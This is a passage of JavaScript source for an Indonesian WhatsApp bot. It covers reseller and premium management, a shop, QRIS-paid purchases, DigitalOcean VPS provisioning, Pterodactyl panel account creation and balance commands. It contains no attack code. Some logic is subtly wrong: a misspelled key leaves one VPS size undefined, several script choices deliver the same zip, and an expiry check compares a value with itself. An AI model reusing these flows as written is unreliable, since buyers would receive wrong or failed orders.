        teks += `──────────────────────────\n`; // Garis pemisah antar reseller
    }

    teks += `\n *Total Premium:* ${seller.length}\n`; // Menampilkan total reseller

    conn.sendMessage(m.chat, { text: teks, mentions: seller }, { quoted: qtext2 });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'delseller': {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return Reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return Reply(`Tidak bisa menghapus owner!`)
if (!premium.includes(input)) return Reply(`Nomor ${input2} bukan reseller!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
Reply(`Berhasil menghapus reseller ✅\nNomor: ${input2}☠️`)
}
break

case 'delseller2': {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return Reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return Reply(`Tidak bisa menghapus owner!`)
if (!premium2.includes(input)) return Reply(`Nomor ${input2} bukan reseller2!`)
let posi = premium2.indexOf(input)
await premium2.splice(posi, 1)
await fs.writeFileSync("./library/database/premium2.json", JSON.stringify(premium2, null, 2))
Reply(`Berhasil menghapus reseller 2✅\nNomor: ${input2}☠️`)
}
break

case 'delprem': {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return Reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return Reply(`Tidak bisa menghapus owner!`)
if (!seller.includes(input)) return Reply(`Nomor ${input2} bukan premium!`)
let posi = seller.indexOf(input)
await seller.splice(posi, 1)
await fs.writeFileSync("./library/database/seller.json", JSON.stringify(seller, null, 2))
Reply(`Berhasil menghapus premium ✅\nNomor: ${input2}☠️`)
}
break

case 'resetseller': {
    if (!isCreator) return Reply(mess.owner);
    
    // Pastikan database ada sebelum mencoba menghapus
    if (!Array.isArray(premium) || premium.length === 0) {
        return Reply("Tidak ada reseller yang terdaftar saat ini!");
    }

    // Reset array reseller
    premium.length = 0;

    // Simpan perubahan ke file database
    try {
        await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2));
        Reply("Semua reseller telah berhasil dihapus ✅");
    } catch (err) {
        console.error("Error saat menyimpan database:", err);
        m.reply("Terjadi kesalahan saat menghapus reseller ❌");
    }
}
break;

case 'resetseller2': {
    if (!isCreator) return Reply(mess.owner);
    
    // Pastikan database ada sebelum mencoba menghapus
    if (!Array.isArray(premium2) || premium2.length === 0) {
        return Reply("Tidak ada reseller 2 yang terdaftar saat ini!");
    }

    // Reset array reseller
    premium2.length = 0;

    // Simpan perubahan ke file database
    try {
        await fs.writeFileSync("./library/database/premium2.json", JSON.stringify(premium2, null, 2));
        Reply("Semua reseller 2 telah berhasil dihapus ✅");
    } catch (err) {
        console.error("Error saat menyimpan database:", err);
        m.reply("Terjadi kesalahan saat menghapus reseller ❌");
    }
}
break;

case 'resetprem': {
    if (!isCreator) return Reply(mess.owner);
    
    // Pastikan database ada sebelum mencoba menghapus
    if (!Array.isArray(seller) || seller.length === 0) {
        return Reply("Tidak ada premium yang terdaftar saat ini!");
    }

    // Reset array reseller
    seller.length = 0;

    // Simpan perubahan ke file database
    try {
        await fs.writeFileSync("./library/database/seller.json", JSON.stringify(seller, null, 2));
        Reply("Semua premium telah berhasil dihapus ✅");
    } catch (err) {
        console.error("Error saat menyimpan database:", err);
        m.reply("Terjadi kesalahan saat menghapus reseller ❌");
    }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'buyakses': {
  await conn.sendMessage(m.chat, {
    footer: `© 2025 ${botname}`,
    buttons: [
      {
        buttonId: 'action',
        buttonText: { displayText: '🔑 Pilih Akses' },
        type: 4,
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: '🔐 Pilih Akses Lain',
            sections: [
              {
                title: '📌 List Akses Tersedia',
                rows: [
                  {
                    title: '👑 BUY OWNER',
                    description: "💵 Harga 1 Bulan: Rp55.000\n💵 Harga Permanen: Rp75.000",
                    id: '.buyowner'
                  },
                  {
                    title: '🛒 BUY PREMIUM',
                    description: "💵 Harga 1 Bulan: Rp10.000\n💵 Harga Permanen: Rp15.000",
                    id: '.buypremium'
                  },
                  {
                    title: '🛒 BUY SELLER',
                    description: "💵 Harga 1 Bulan: Rp10.000\n💵 Harga Permanen: Rp15.000",
                    id: '.buyseller'
                  }                
                ]
              }
            ]
          })
        }
      }
    ],
    headerType: 1,
    viewOnce: true,
    image: { url: global.image.reply }, 
    caption: "\n```🔐 Silahkan Pilih Akses Yang Tersedia Di 々 IjulTaka || 乂, Dibawah Ini!!```"
  }, { quoted: qtext2 });

  // Tambahan tombol di bawahnya
  await conn.sendMessage(m.chat, {
    buttons: [
      { buttonId: '.deposit', buttonText: { displayText: '💰 Deposit' }, type: 1 },
      { buttonId: '.owner', buttonText: { displayText: '👤 Hubungi Developer' }, type: 1 }
    ],
    footer: `© 2025 ${botname}`,
    headerType: 1,
    viewOnce: true,
    text: teks,
    contextInfo: {
      isForwarded: true, 
      mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"], 
    },
  }, { quoted: qtext2 });
}
break;

case 'cekshop': 
case 'shop': {
  await conn.sendMessage(m.chat, {
    footer: `© 2025 ${botname}`,
    buttons: [
      {
        buttonId: 'action',
        buttonText: { displayText: '🛒 Pilih Shop' },
        type: 4,
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: '🛍️ Pilih Shop Lain',
            sections: [
              {
                title: '📌 List Shop Tersedia',
                rows: [
                  {
                    title: '⚙️ Admin Panel Pterodactyl 1',                  
                    id: '.buyadp'
                  },
                  {
                    title: '⚙️ Admin Panel Pterodactyl 2',                  
                    id: '.buyadp-v2'
                  },
                  {
                    title: '🖥️ Panel Pterodactyl',                  
                    id: '.buypanel'
                  },
                  {
                    title: '🤖 Script Bot WhatsApp',                  
                    id: '.buysc'
                  },
                  {
                    title: '💻 VPS (Virtual Private Server)',                  
                    id: '.buyvps'
                  }                  
                ]
              }
            ]
          })
        }
      }
    ],
    headerType: 1,
    viewOnce: true,
    image: { url: global.image.reply }, 
    caption: "\n```🛍️ Silahkan Pilih Shop Yang Tersedia Di 々 IjulTaka || 乂, Dibawah Ini!!```"
  }, { quoted: qtext2 });

  // Tombol tambahan di bawahnya
  await conn.sendMessage(m.chat, {
    buttons: [
      { buttonId: '.deposit', buttonText: { displayText: '💰 Deposit' }, type: 1 },
      { buttonId: '.owner', buttonText: { displayText: '👤 Hubungi Developer' }, type: 1 }
    ],
    footer: `© 2025 ${botname}`,
    headerType: 1,
    viewOnce: true,
    text: teks,
    contextInfo: {
      isForwarded: true, 
      mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"], 
    },
  }, { quoted: qtext2 });
}
break;

case 'buyscript': case 'buysc': {
if (m.isGroup) return m.reply("Pembelian script hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!text) return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Script Bot',
          sections: [
            {
              title: 'List Script Bot WhatsApp',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'AanzCuyxzxz-V5', 
                  description: "Rp40.000", 
                  id: '.buysc 1'
                },
                {
                  title: 'Simple Bot V5.5 (Database)', 
                  description: "Rp50.000", 
                  id: '.buysc 2'
                },
                {
                  title: 'YilziShop V6', 
                  description: "Rp60.000", 
                  id: '.buysc 3'
                },
                {
                  title: 'RafatharCode V5', 
                  description: "Rp55.000", 
                  id: '.buysc 4'
                },
                {
                  title: 'OrderKuota Button V2', 
                  description: "Rp35.000", 
                  id: '.buysc 5'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Script Bot Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})

tek = text.toLowerCase()
let Obj = {}

if (tek == "1") {
    Obj.file = "./source/media/script1.zip"
    Obj.harga = "40000"
    Obj.namaSc = "AanzCuyxzxz-V5"
} else if (tek == "2") {
    Obj.file = "./source/media/script2.zip"
    Obj.harga = "50000"
    Obj.namaSc = "Simple Bot V5.5 (Database)"  
} else if (tek == "3") {
    Obj.file = "./source/media/script2.zip"
    Obj.harga = "60000"
    Obj.namaSc = "YilziShop V6"  
} else if (tek == "4") {
    Obj.file = "./source/media/script2.zip"
    Obj.harga = "55000"
    Obj.namaSc = "RafatharCode V5"
} else if (tek == "5") {
    Obj.file = "./source/media/script2.zip"
    Obj.harga = "35000"
    Obj.namaSc = "OrderKuota Button V2"
} else return

const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* ${Obj.namaSc}
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await conn.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()
while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
var orang = db.users[m.sender].saweria.chat
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* ${Obj.namaSc}
`}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(orang, {document: await fs.readFileSync(Obj.file), mimetype: "application/zip", fileName: Obj.namaSc}, {quoted: null})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}
}
break

case 'buyvps': {
if (m.isGroup) return m.reply("Pembelian vps hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")

if (!text) return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Spesifikasi Vps',
          sections: [
            {
              title: 'List Ram Server Vps',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Ram 16 & Cpu 4', 
                  description: "Rp55.000", 
                  id: '.buyvps 4'
                },
                {
                  title: 'Ram 2 & Cpu 1', 
                  description: "Rp25.000", 
                  id: '.buyvps 1'
                },
                {
                  title: 'Ram 4 & Cpu 2', 
                  description: "Rp35.000", 
                  id: '.buyvps 2'
                },
                {
                  title: 'Ram 8 & Cpu 4', 
                  description: "Rp45.000", 
                  id: '.buyvps 3'
                }                       
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Ram Server Vps Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
tek = text.toLowerCase()
let Obj = {}

    if (tek == "1") {
    Obj.images = "s-1vcpu-2gb"
    Obj.harga = "25000"
    } else if (tek == "2") {
    Obj.images = "s-2vcpu-4gb"
    Obj.harga = "35000"
    } else if (tek == "3") {
    Obj.imagess = "s-4vcpu-8gb"
    Obj.harga = "45000"
    } else if (tek == "4") {
    Obj.images = "s-4vcpu-16gb"
    Obj.harga = "55000"
    } else return m.reply(teks)
    
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Vps Digital Ocean
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await conn.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()
while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Vps Digital Ocean
`}, {quoted: db.users[m.sender].saweria.msg})
var orang = db.users[m.sender].saweria.chat
    let hostname = "#" + m.sender.split("@")[0]
    
    try {        
        let dropletData = {
            name: hostname,
            region: "sgp1", 
            size: Obj.images,
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        let password = await generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apiDigitalOcean 
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            await m.reply(`Memproses pembuatan vps...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apiDigitalOcean
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `VPS berhasil dibuat!\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}`;

            await conn.sendMessage(orang, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'buypanel': {
if (m.isGroup) return m.reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!text) return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Ram Panel Private',
          sections: [
            {
              title: 'List Ram Server Panel Private',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Ram Unlimited', 
                  description: "Rp15.000", 
                  id: '.buypanel unlimited'
                },
                {
                  title: 'Ram 1GB', 
                  description: "Rp2000", 
                  id: '.buypanel 1gb'
                },
                {
                  title: 'Ram 2GB', 
                  description: "Rp3000", 
                  id: '.buypanel 2gb'
                },
                {
                  title: 'Ram 3GB', 
                  description: "Rp4000", 
                  id: '.buypanel 3gb'
                },
                {
                  title: 'Ram 4GB', 
                  description: "Rp5000", 
                  id: '.buypanel 4gb'
                },      
                {
                  title: 'Ram 5GB', 
                  description: "Rp6000", 
                  id: '.buypanel 5gb'
                },       
                {
                  title: 'Ram 6GB', 
                  description: "Rp7000", 
                  id: '.buypanel 6gb'
                },
                {
                  title: 'Ram 7GB', 
                  description: "Rp8000", 
                  id: '.buypanel 7gb'
                },        
                {
                  title: 'Ram 8GB', 
                  description: "Rp9000", 
                  id: '.buypanel 8gb'
                },   
                {
                  title: 'Ram 9GB', 
                  description: "Rp10000", 
                  id: '.buypanel 9gb'
                },       
                {
                  title: 'Ram 10GB', 
                  description: "Rp11.000", 
                  id: '.buypanel 10gb'
                },                                       
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Ram Server Panel Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
let Obj = {}
let cmd = text.toLowerCase()
if (cmd == "1gb") {
Obj.ram = "1000"
Obj.disk = "1000"
Obj.cpu = "40"
Obj.harga = "2000"
} else if (cmd == "2gb") {
Obj.ram = "2000"
Obj.disk = "1000"
Obj.cpu = "60"
Obj.harga = "3000"
} else if (cmd == "3gb") {
Obj.ram = "3000"
Obj.disk = "2000"
Obj.cpu = "80"
Obj.harga = "4000"
} else if (cmd == "4gb") {
Obj.ram = "4000"
Obj.disk = "2000"
Obj.cpu = "100"
Obj.harga = "5000"
} else if (cmd == "5gb") {
Obj.ram = "5000"
Obj.disk = "3000"
Obj.cpu = "120"
Obj.harga = "6000"
} else if (cmd == "6gb") {
Obj.ram = "6000"
Obj.disk = "3000"
Obj.cpu = "140"
Obj.harga = "7000"
} else if (cmd == "7gb") {
Obj.ram = "7000"
Obj.disk = "4000"
Obj.cpu = "160"
Obj.harga = "8000"
} else if (cmd == "8gb") {
Obj.ram = "8000"
Obj.disk = "4000"
Obj.cpu = "180"
Obj.harga = "9000"
} else if (cmd == "9gb") {
Obj.ram = "9000"
Obj.disk = "5000"
Obj.cpu = "200"
Obj.harga = "10000"
} else if (cmd == "10gb") {
Obj.ram = "10000"
Obj.disk = "5000"
Obj.cpu = "220"
Obj.harga = "11000"
} else if (cmd == "unli" || cmd == "unlimited") {
Obj.ram = "0"
Obj.disk = "0"
Obj.cpu = "0"
Obj.harga = "15000"
} else return m.reply(teks)

const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(550, 850)

const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)

const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Panel Pterodactyl Private
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.
`
let msgQr = await conn.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Panel Pterodactyl Private
`}, {quoted: db.users[m.sender].saweria.msg})
let username = crypto.randomBytes(4).toString('hex')
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": Obj.ram,
"swap": 0,
"disk": Obj.disk,
"io": 500,
"cpu": Obj.cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang = db.users[m.sender].saweria.chat
var tekspanel = `*Data Akun Panel Private Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}

*🌐 Spesifikasi Server*
* Ram : *${Obj.ram == "0" ? "Unlimited" : Obj.ram.split("").length > 4 ? Obj.ram.split("").slice(0,2).join("") + "GB" : Obj.ram.charAt(0) + "GB"}*
* Disk : *${Obj.disk == "0" ? "Unlimited" : Obj.disk.split("").length > 4 ? Obj.disk.split("").slice(0,2).join("") + "GB" : Obj.disk.charAt(0) + "GB"}*
* CPU : *${Obj.cpu == "0" ? "Unlimited" : Obj.cpu+"%"}*
* ${global.domain}

*Syarat & Ketentuan :*
* Expired panel 1 bulan
* Simpan data ini sebaik mungkin
* Garansi pembelian 15 hari (1x replace)
* Claim garansi wajib membawa bukti chat pembelian
`
await fs.writeFileSync("./akunpanel.txt", tekspanel)
await conn.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: tekspanel}, {quoted: null})
await fs.unlinkSync("./akunpanel.txt")
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

case 'saldo':  
case 'ceksaldo': {  
    // Mengatur zona waktu ke WIB (GMT+7)
    let options = { timeZone: 'Asia/Jakarta', hour12: false };
    let now = new Date().toLocaleString('id-ID', options);
    
    let saldoUser = toRupiah(cekSaldo(m.sender, db_saldo));
    
    let teksSaldo = `📢 *━━ CHECK YOUR INFO ━━* 📢\n\n` +  
                    `📅 *Tanggal & Waktu:* ${now} WIB\n` +  
                    `👤 *Name:* ${m.pushName}\n` +  
                    `📞 *Nomor:* ${m.sender.split('@')[0]}\n` +  
                    `💰 *Saldo:* Rp${saldoUser}\n\n` +  
                    `⚠️ *Note:*\n` +  
                    `🔹 Saldo hanya bisa digunakan untuk bertransaksi di bot.\n` +  
                    `🚫 Tidak bisa ditarik atau ditransfer ke luar bot!`;

    await conn.sendMessage(m.chat, {
      buttons: [
        { buttonId: `.owner`, buttonText: { displayText: 'Developer' }, type: 1 },
        { buttonId: `.buysaldo`, buttonText: { displayText: 'Buy Saldo' }, type: 1 }
      ],
      footer: `© 2025 ${botname}`,
      headerType: 1,
      viewOnce: true,
      text: teksSaldo,
      contextInfo: {
        isForwarded: true, 
        mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
      },
    }, { quoted: m });
}  
break;

case 'addsaldo':  
case 'acc': {  
    if (!isCreator) return Reply(mess.owner);  
    if (!q.split(",")[0]) return Reply(`⚠️ *Format Salah!*\n\n🔹 Contoh Penggunaan:\n${command} 628xxx,20000`);  
    if (!q.split(",")[1]) return Reply(`⚠️ *Format Salah!*\n\n🔹 Contoh Penggunaan:\n${command} 628xxx,20000`);  

    let targetNumber = q.split(",")[0] + "@s.whatsapp.net";  
    let amount = Number(q.split(",")[1]);  

    // Menambahkan saldo ke pengguna  
    addSaldo(targetNumber, amount, db_saldo);  

